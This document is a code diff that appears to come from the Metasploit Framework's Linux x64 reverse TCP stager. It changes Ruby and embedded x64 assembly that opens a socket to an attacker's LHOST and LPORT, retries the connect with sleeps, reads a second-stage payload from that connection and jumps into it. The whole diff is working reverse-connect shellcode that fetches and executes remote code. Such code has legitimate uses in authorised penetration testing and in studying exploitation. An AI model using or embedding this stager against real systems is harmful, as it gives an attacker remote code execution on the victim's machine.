@@ -25,7 +25,7 @@ module Payload::Linux::ReverseTcp_x64
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
-      retry_count: datastore['ReverseConnectRetries'],
+      retry_count:   datastore['StagerRetryCount'],
       sleep_seconds: datastore['StagerRetryWait'],
     }
 
@@ -107,8 +107,6 @@ module Payload::Linux::ReverseTcp_x64
 
         push   #{retry_count}        ; retry counter
         pop    r9
-
-      create_socket:
         push   rsi
         push   rax
         push   0x29
@@ -122,8 +120,9 @@ module Payload::Linux::ReverseTcp_x64
         test   rax, rax
         js failed
 
-      connect:
         xchg   rdi, rax
+
+      connect:
         mov    rcx, 0x#{encoded_host}#{encoded_port}
         push   rcx
         mov    rsi, rsp
@@ -132,12 +131,14 @@ module Payload::Linux::ReverseTcp_x64
         push   0x2a
         pop    rax
         syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
+        pop    rcx
         test   rax, rax
         jns    recv
 
       handle_failure:
         dec    r9
         jz     failed
+        push   rdi
         push   0x23
         pop    rax
         push   0x#{sleep_nanoseconds.to_s(16)}
@@ -145,19 +146,11 @@ module Payload::Linux::ReverseTcp_x64
         mov    rdi, rsp
         xor    rsi, rsi
         syscall                      ; sys_nanosleep
-        test   rax, rax
-        jns    create_socket
-        jmp    failed
-
-      recv:
         pop    rcx
-        pop    rsi
-        pop    rdx
-        syscall	; read(3, "", 4096)
+        pop    rcx
+        pop    rdi
         test   rax, rax
-        js     failed
-
-        jmp    rsi ; to stage
+        jns    connect
 
       failed:
         push   0x3c
@@ -165,6 +158,15 @@ module Payload::Linux::ReverseTcp_x64
         push   0x1
         pop    rdi
         syscall ; exit(1)
+
+      recv:
+        pop    rsi
+        pop    rdx
+        syscall ; read(3, "", 4096)
+        test   rax, rax
+        js     failed
+
+        jmp    rsi ; to stage
     ^
 
     asm
